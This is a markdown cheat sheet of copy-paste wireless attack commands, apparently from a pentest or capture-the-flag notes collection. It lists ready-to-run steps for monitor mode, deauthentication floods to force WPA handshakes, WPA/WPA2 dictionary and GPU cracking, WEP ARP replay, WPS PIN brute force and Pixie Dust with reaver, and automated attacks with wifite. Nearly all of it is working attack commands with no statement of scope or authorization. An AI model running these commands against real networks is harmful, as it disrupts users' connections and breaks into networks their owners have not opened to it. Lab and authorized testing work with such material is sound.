# 14 Wireless — copy-paste commands

> Replace `<IFACE>` with `wlan0`, `<BSSID>` with AP MAC, `<CH>` with channel.

## Monitor mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Now interface is usually wlan0mon
iwconfig
```

## Discover APs

```bash
# Scan everything
sudo airodump-ng wlan0mon

# Scan only 2.4 / only 5 GHz
sudo airodump-ng --band bg wlan0mon
sudo airodump-ng --band a  wlan0mon
```

## Targeted capture (lock channel + BSSID)

```bash
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
# Writes capture-01.cap
```

## Force a WPA handshake (deauth)

```bash
# 5 deauths targeting all clients
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon

# Target one client
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

Watch airodump's top-right for `WPA handshake: <BSSID>`.

## Crack WPA/WPA2 (dictionary)

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap
```

## Crack WPA with hashcat (faster, GPU)

```bash
# Convert cap → hashcat format
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## WEP — ARP replay attack

```bash
# 1. Start capture
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon

# 2. Fake auth with the AP
sudo aireplay-ng -1 0 -a <BSSID> wlan0mon

# 3. ARP replay — generates IVs fast
sudo aireplay-ng -3 -b <BSSID> wlan0mon

# 4. Crack once you have ~20-40k IVs
aircrack-ng wep-01.cap
```

## WPS attacks — reaver / wash

```bash
# Find WPS-enabled APs
sudo wash -i wlan0mon

# Pixie Dust (seconds, if vulnerable)
sudo reaver -i wlan0mon -b <BSSID> -K 1 -vv

# Full PIN brute (hours)
sudo reaver -i wlan0mon -b <BSSID> -vv
```

## wifite — one tool to rule them all

```bash
sudo wifite
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt
sudo wifite --wps
```

## Offline-only: "here's a cap, crack it"

```bash
# Check it contains a handshake
aircrack-ng capture.cap

# Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

## Cleanup — restore managed mode

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```
